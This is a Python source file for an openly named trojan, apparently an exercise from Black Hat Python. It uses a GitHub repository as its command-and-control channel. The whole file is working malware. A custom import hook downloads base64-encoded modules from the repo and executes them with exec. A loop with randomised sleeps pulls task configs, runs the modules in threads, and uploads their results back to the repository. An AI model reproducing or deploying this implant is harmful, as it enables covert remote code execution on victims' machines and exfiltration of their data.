import os
import base64
import sys
import time
import imp  # importlib
import importlib
import random
import threading
import queue
import os
import json

from dotenv import load_dotenv
from github3 import login


load_dotenv()
USERNAME = os.getenv("GITHUB_USERNAME")
PASSWORD = os.getenv("GITHUB_PASSWORD")


trojan_id = "abc"

trojan_config = "{}.json".format(trojan_id)
data_path = "data/{}/".format(trojan_id)
trojan_modules = []

task_queue = queue.Queue()
configured = False


class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):

        if configured:
            print("[*] Attempting to retrieve {}".format(fullname))
            new_library = get_file_contents("modules/{}".format(fullname))
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):
        module = imp.new_module(name)
        # module = importlib.import_module(name, "modules")
        exec(self.current_module_code, module.__dict__)
        # module = importlib.import_module(name, "modules")
        # exec("self.current_module_code in module.__dict__")  #!?!?!?
        sys.modules[name] = module
        return module


def connect_to_github():
    gh = login(username=USERNAME, password=PASSWORD)
    repo = gh.repository(USERNAME, "bhp")
    branch = repo.branch("master")
    return gh, repo, branch


def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found file {}".format(filepath))
            # blob = repo.blob(filename._json_data["sha"])
            blob = repo.blob(filename.as_dict()["sha"])
            return blob.content
    return None


def get_trojan_config():

    global configured

    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task["module"] not in sys.modules:
            exec("import {}".format(task["module"]))

    return config


def store_module_result(data):

    gh, repo, branch = connect_to_github()

    remote_path = "data/{}/{}.data".format(
        trojan_id, random.randint(1000, 1000000)
    )

    repo.create_file(
        remote_path, "Commit message", base64.b64encode(bytes(data, "utf-8"))
    )
    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    print(result)
    task_queue.get()
    store_module_result(result)
    return


sys.meta_path = [GitImporter()]


while True:
    if task_queue.empty():

        config = get_trojan_config()

        for task in config:

            t = threading.Thread(target=module_runner, args=(task["module"],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))
